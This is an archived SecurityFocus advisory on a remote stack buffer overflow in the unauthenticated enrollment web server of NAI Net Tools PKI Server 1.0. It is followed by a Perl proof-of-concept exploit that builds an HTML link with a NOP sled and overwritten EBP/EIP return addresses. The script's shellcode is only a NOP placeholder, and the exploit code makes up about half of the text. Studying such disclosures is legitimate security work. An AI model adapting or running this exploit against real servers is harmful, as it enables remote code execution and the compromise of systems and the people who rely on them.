source: http://www.securityfocus.com/bid/1536/info

Certain versions of Network Associates Inc.'s Net Tools PKI (Public Key Infrastructure) server ship with a buffer overflow vulnerability which could lead to a remote compromise of the system running the PKI server. The problem lies within the webserver component of the PKI server (strong.exe) which operates several 'virtual servers' required to operate the PKI server. The first is the Administrative Web Server which listens via TCP port 443, the second is Enrollment Web Server which listens on TCP port 444. Unlike the Administrative Web Server the Enrollment Web Server does not require credentials to be exchanged before a user can talk to the webserver. It is via this virtual server that an attacker can exploit the problem at hand.

In particular this problem is located in the PKI servers log generation routines. In order to exploit it, a user must simply connect via an HTTPS connection to port 444 and provide an overly long URL (2965 + characters) which will be mishandled by the log routines resulting in a buffer overflow. 

#!/usr/bin/perl
# NAI NetTools PKI SERVER 1.0 - Long URL Stack Overflow Exploit
# Replace host and port an create the html file:
#./pkiluso.pl > test.html
#Open the html in a SSL compatible browser and click on the link. puf!
#Juliano Rizzo (c) 2000 juliano@core-sdi.com

$host = "localhost";
$port = "444";
$shell_code= "\x90\x90\x90\x90";

#We can set the values of EIP and EBP, our code is on the stack
#and in 0x01613A2E.
$eip = "\x2E\x3A\x61\x01";#0x01613A2E (URL readed from socket)
#$eip = "\x64\x83\x40%00";#0x00408364 (CALL EBP)
$ebp = "\xCB\xF2\01\x02"; #0x0200F2CB (trunca el string por el 00)
$noplen = (2965 - length($shell_code));
print "<html><body><a href=\"https://".$host.":".$port."/";
print "\x90"x$noplen;
print
$shell_code.$ebp.$eip."\x18\x6B\x62\x01\x18\x6B\x62\x01\x18\x6B\x62\x01".
"\">Click here to exploit.!</a></body></html>";